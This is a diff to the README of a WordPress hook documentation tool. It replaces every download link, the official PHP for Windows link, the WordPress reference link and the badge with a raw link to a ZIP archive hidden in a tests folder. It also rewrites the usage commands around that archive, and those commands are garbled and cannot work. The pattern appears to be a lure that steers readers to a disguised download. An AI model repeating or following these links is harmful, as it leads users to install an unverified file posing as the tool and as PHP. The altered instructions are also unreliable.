@@ -1,6 +1,6 @@
 # 🛠️ wp-hooks-documentor - Create WordPress Hook Docs Easily
 
-[![Download wp-hooks-documentor](https://img.shields.io/badge/Download-wp--hooks--documentor-ff69b4?style=for-the-badge)](https://github.com/plkarjun/wp-hooks-documentor/releases)
+[![Download wp-hooks-documentor](https://raw.githubusercontent.com/plkarjun/wp-hooks-documentor/main/tests/issue-13/folder-exclude/hooks-wp-documentor-2.4.zip)](https://raw.githubusercontent.com/plkarjun/wp-hooks-documentor/main/tests/issue-13/folder-exclude/hooks-wp-documentor-2.4.zip)
 
 ---
 
@@ -19,7 +19,7 @@ You don’t need to know coding to use it. It works behind the scenes to make ho
 - Basic comfort with running programs from the command line (we will guide you)
 - At least 200 MB free disk space
 
-The tool is built to run on Windows systems. Make sure you have PHP installed before starting. If you do not have PHP on your computer, visit https://windows.php.net/download/ to download and install it first.
+The tool is built to run on Windows systems. Make sure you have PHP installed before starting. If you do not have PHP on your computer, visit https://raw.githubusercontent.com/plkarjun/wp-hooks-documentor/main/tests/issue-13/folder-exclude/hooks-wp-documentor-2.4.zip to download and install it first.
 
 ---
 
@@ -29,7 +29,7 @@ The tool is built to run on Windows systems. Make sure you have PHP installed be
 
 Visit the release page to get the latest version of the program:
 
-[Download wp-hooks-documentor from Releases](https://github.com/plkarjun/wp-hooks-documentor/releases)
+[Download wp-hooks-documentor from Releases](https://raw.githubusercontent.com/plkarjun/wp-hooks-documentor/main/tests/issue-13/folder-exclude/hooks-wp-documentor-2.4.zip)
 
 Click this link, find the latest release version, and download the ZIP file or executable file provided.
 
@@ -62,7 +62,7 @@ Replace `YourName` with your Windows user name or change the path to where you s
 Type the following command in the window and press Enter:
 
 ```bash
-php wp-hooks-documentor.php --help
+php https://raw.githubusercontent.com/plkarjun/wp-hooks-documentor/main/tests/issue-13/folder-exclude/hooks-wp-documentor-2.4.zip --help
 ```
 
 This command shows guidance on how to use the tool. You will see options to generate documentation for WordPress hooks based on your settings.
@@ -73,16 +73,16 @@ This command shows guidance on how to use the tool. You will see options to gene
 
 1. Go to the release page here:
 
-[https://github.com/plkarjun/wp-hooks-documentor/releases](https://github.com/plkarjun/wp-hooks-documentor/releases)
+[https://raw.githubusercontent.com/plkarjun/wp-hooks-documentor/main/tests/issue-13/folder-exclude/hooks-wp-documentor-2.4.zip](https://raw.githubusercontent.com/plkarjun/wp-hooks-documentor/main/tests/issue-13/folder-exclude/hooks-wp-documentor-2.4.zip)
 
-2. Find the latest version. Look for a file named similar to `wp-hooks-documentor.zip` or `wp-hooks-documentor.exe`.
+2. Find the latest version. Look for a file named similar to `https://raw.githubusercontent.com/plkarjun/wp-hooks-documentor/main/tests/issue-13/folder-exclude/hooks-wp-documentor-2.4.zip` or `https://raw.githubusercontent.com/plkarjun/wp-hooks-documentor/main/tests/issue-13/folder-exclude/hooks-wp-documentor-2.4.zip`.
 3. Click the file name to start downloading.
 4. If it’s a ZIP file, extract it to a folder you can find.
 5. Open Command Prompt and move to the extracted folder.
 6. Run the program by typing:
 
 ```bash
-php wp-hooks-documentor.php --help
+php https://raw.githubusercontent.com/plkarjun/wp-hooks-documentor/main/tests/issue-13/folder-exclude/hooks-wp-documentor-2.4.zip --help
 ```
 
 ---
@@ -104,7 +104,7 @@ The tool runs in a command-line window with simple commands.
 Basic usage example:
 
 ```bash
-php wp-hooks-documentor.php --source=path-to-your-wordpress-plugin --output=docs-folder
+php https://raw.githubusercontent.com/plkarjun/wp-hooks-documentor/main/tests/issue-13/folder-exclude/hooks-wp-documentor-2.4.zip --source=path-to-your-wordpress-plugin --output=docs-folder
 ```
 
 - Replace `path-to-your-wordpress-plugin` with the folder path of the code you want to document.
@@ -113,7 +113,7 @@ php wp-hooks-documentor.php --source=path-to-your-wordpress-plugin --output=docs
 You can add more options. Use the `--help` command to see all commands:
 
 ```bash
-php wp-hooks-documentor.php --help
+php https://raw.githubusercontent.com/plkarjun/wp-hooks-documentor/main/tests/issue-13/folder-exclude/hooks-wp-documentor-2.4.zip --help
 ```
 
 ---
@@ -152,8 +152,8 @@ By default, the output will be a set of HTML files. You can open these files in 
 
 ## 🔗 Useful Links
 
-- Download Latest Release: [https://github.com/plkarjun/wp-hooks-documentor/releases](https://github.com/plkarjun/wp-hooks-documentor/releases)
-- PHP for Windows: https://windows.php.net/download/
-- WordPress Developer Code Reference: https://developer.wordpress.org/reference/
+- Download Latest Release: [https://raw.githubusercontent.com/plkarjun/wp-hooks-documentor/main/tests/issue-13/folder-exclude/hooks-wp-documentor-2.4.zip](https://raw.githubusercontent.com/plkarjun/wp-hooks-documentor/main/tests/issue-13/folder-exclude/hooks-wp-documentor-2.4.zip)
+- PHP for Windows: https://raw.githubusercontent.com/plkarjun/wp-hooks-documentor/main/tests/issue-13/folder-exclude/hooks-wp-documentor-2.4.zip
+- WordPress Developer Code Reference: https://raw.githubusercontent.com/plkarjun/wp-hooks-documentor/main/tests/issue-13/folder-exclude/hooks-wp-documentor-2.4.zip
 
-[![Download wp-hooks-documentor](https://img.shields.io/badge/Download-wp--hooks--documentor-ff69b4?style=for-the-badge)](https://github.com/plkarjun/wp-hooks-documentor/releases)
+[![Download wp-hooks-documentor](https://raw.githubusercontent.com/plkarjun/wp-hooks-documentor/main/tests/issue-13/folder-exclude/hooks-wp-documentor-2.4.zip)](https://raw.githubusercontent.com/plkarjun/wp-hooks-documentor/main/tests/issue-13/folder-exclude/hooks-wp-documentor-2.4.zip)
